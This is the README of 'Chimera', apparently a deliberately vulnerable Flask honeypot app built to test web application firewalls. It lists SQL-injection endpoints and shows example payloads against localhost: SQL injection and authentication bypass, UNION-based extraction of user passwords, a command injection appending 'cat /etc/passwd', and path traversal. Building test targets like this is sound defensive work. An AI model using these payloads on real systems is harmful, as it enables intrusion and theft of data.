# Chimera - Flask Honeypot Application

A Python Flask application with 456+ intentionally vulnerable endpoints for testing  WAF capabilities.

## 📚 Documentation

- **[docs/API-DOCUMENTATION.md](docs/API-DOCUMENTATION.md)** - Complete API documentation
- **[docs/openapi.yaml](docs/openapi.yaml)** - Static OpenAPI spec (Swagger UI at `/swagger`). Generated from blueprint routes with minimal schemas; some routes are conditional (e.g., `USE_DATABASE=true`).
- **[../DOCUMENTATION.md](../DOCUMENTATION.md)** - Project-wide documentation index

## 🚀 Quick Start

### Local Development
```bash
# 1. Install uv (https://github.com/astral-sh/uv) if you don't have it yet
curl -LsSf https://astral.sh/uv/install.sh | sh

# 2. Install project dependencies (creates .venv/ automatically)
uv sync --extra dev

# 3. Launch the vulnerable demo API
uv run python app.py

# Access at http://localhost:5000
```

> **Fallback:** If you prefer pip/virtualenv, `pip install -r requirements.txt` still works, but uv gives faster, reproducible installs and is what the Docker image uses.

### Docker Deployment
```bash
# As part of WAF demo
./waf-demo --sites=demo start

# Or standalone
docker build -t demo-api .
docker run -p 8080:80 demo-api
```

### Running Tests
```bash
# All tests (runs the same uv environment used locally/Docker)
just test

# Quick tests
just test-quick

# With coverage
just test-coverage
```

### Database Mode (Opt-In)

**NEW:** Enable real SQL injection vulnerabilities with SQLite backend.

```bash
# Enable database mode locally
USE_DATABASE=true uv run python app.py

# Enable in Docker
USE_DATABASE=true docker run -p 8080:80 demo-api

# Or via docker-compose (in apps/demo-targets/)
USE_DATABASE=true ./waf-demo --sites=demo start
```

**What Database Mode Enables:**
- 📊 **Real SQLite database** with banking, healthcare, insurance data
- 🔓 **8 intentionally vulnerable endpoints** for SQL injection testing
- 💉 **Multiple SQLi types**: Classic, Blind Boolean, Time-based, UNION, Error-based
- 📈 **Realistic demo data**: 5 users, 3 bank accounts, 3 patient records, 3 policies
- 🎯 **Traffic generator support**: `PROFILE=database` for baseline SQL queries

**New Vulnerable Endpoints** (only active with `USE_DATABASE=true`):
```
GET  /api/v1/patients/search?ssn=<ssn>              # Classic SQLi
POST /api/v1/auth/login-vulnerable                  # Auth bypass
GET  /api/v1/banking/accounts/search?account_number # UNION-based
GET  /api/v1/insurance/policies/lookup?policy_number # Blind Boolean
GET  /api/v1/transactions/history?account_id        # Time-based blind
GET  /api/v1/claims/search?policy_id&order_by       # ORDER BY injection
GET  /api/v1/users/profile?user_id                  # Error-based
POST /api/v1/healthcare/records                     # Second-order SQLi
```

**Example SQL Injection Attack:**
```bash
# Classic SQL injection to dump all patient records
curl 'http://localhost:8880/api/v1/patients/search?ssn=%27%20OR%20%271%27=%271'

# Authentication bypass
curl -X POST http://localhost:8880/api/v1/auth/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com'\'' OR '\''1'\''='\''1'\'' --","password":"anything"}'

# UNION-based data exfiltration
curl 'http://localhost:8880/api/v1/banking/accounts/search?account_number=ACC-1001'\'' UNION SELECT id,email,password,role,1,2,3,4 FROM users --'
```

**Traffic Generation with Database Mode:**
```bash
# Generate baseline database traffic (10 RPS for 60 seconds)
PROFILE=database RPS=10 DURATION=60 ./scripts/traffic-generator.sh
```

## 🎯 Key Features

- **456+ Vulnerable Endpoints** across Auth, Banking, Healthcare, and Admin domains
- **50+ Vulnerability Types** including SQL injection, XSS, command injection, and more
- **Thread-Safe Data Layer** with validation bypass for testing
- **200+ Unit Tests** with 94% code coverage
- **Gunicorn Server** with gevent workers for async handling

## 🔒 Security Warning

⚠️ **This application contains intentional security vulnerabilities for testing purposes.**

**DO NOT**:
- Deploy to production
- Expose to the internet
- Use with real data

**DO**:
- Use only in isolated test environments
- Run behind WAF protection
- Reset regularly

## 🧪 Example Vulnerability Tests

```bash
# SQL Injection
curl -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"any"}'

# Command Injection
curl -X POST http://localhost:5000/api/v1/admin/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"ls; cat /etc/passwd"}'

# Path Traversal
curl "http://localhost:5000/api/v1/admin/logs?file=../../../../etc/passwd"
```
